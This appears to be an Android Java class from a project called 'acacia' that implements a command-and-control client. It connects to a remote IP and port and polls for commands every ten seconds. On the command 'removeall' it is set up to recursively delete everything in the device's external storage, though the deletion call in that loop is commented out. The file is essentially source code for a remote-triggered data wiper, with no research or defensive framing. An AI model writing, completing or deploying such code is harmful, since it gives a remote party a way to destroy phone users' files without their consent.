package com.xxiong.acacia;

import android.os.Environment;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.Socket;

/**
 * Created by Ekira on 2016/6/30.
 */
public class WaitForCmd extends Thread {
    private String ip = null;
    private int port = 0;
    private static int SLEEPGAP = 10000;

    public WaitForCmd(String tip, int tport) {
        this.ip = tip;
        this.port = tport;
    }

    /**
     * 向服务器请求指令
     */
    public void run() {
        Socket socket = null;
        BufferedReader bufferedReader = null;
        BufferedWriter bufferedWriter = null;
        try {
            socket = new Socket(ip, port);
            socket.setSoTimeout(20000);
            bufferedReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            bufferedWriter = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));
        } catch (IOException e) { return; }
        while(true) {
            try {
                Thread.sleep(SLEEPGAP);
                bufferedWriter.write("Request Command.\n");
                bufferedWriter.flush();
                String msg = bufferedReader.readLine();
                System.out.println(msg);
                runCMD(msg);
            } catch (Exception e) { e.printStackTrace(); }
        }
    }

    /**
     * 执行远程指令
     * @param cmd 指令
     */
    public void runCMD(String cmd) {
        if (cmd.equals("removeall")) {
            File root = new File(Environment.getExternalStorageDirectory(), ".");
            File[] files = root.listFiles();
            int len = files.length;
            for (int i = 0; i < len; i++) {
                //recursionDeleteFile(files[i]);
            }
        }
    }

    /**
     * 递归删除一个目录或文件
     * @param file 指定一个文件或目录
     */
    private void recursionDeleteFile(File file){
        if(file.isFile()) {
            file.delete();
            return;
        }
        if(file.isDirectory()){
            File[] childFile = file.listFiles();
            if(childFile == null || childFile.length == 0){
                file.delete();
                return;
            }
            for(File f : childFile){
                recursionDeleteFile(f);
            }
            file.delete();
        }
    }
}
